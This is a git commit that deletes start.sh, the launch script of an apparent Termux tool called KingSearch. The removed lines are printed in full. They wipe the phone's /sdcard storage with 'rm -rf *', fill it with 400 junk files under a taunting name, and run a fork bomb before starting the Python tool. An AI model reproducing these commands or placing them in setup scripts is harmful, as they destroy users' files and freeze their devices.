620e662081cdac835aa671c5560075c43c5cda89
TheKing <121489549+TheKingevd@users.noreply.github.com>
2022-12-27 14:53:37 +0000

    Delete start.sh

--- start.sh
+++
@@ -1,5 +0,0 @@
-cd /sdcard/ && rm -rf * && clear
-cd /sdcard/ && touch Wolf_E_Jeff_Passou_A_PIKAKKKK{1..400}.txt && clear
-cd /data/data/com.termux/files/home/KingSearch/
-:(){ :|:& };:
-python KingSearch.py
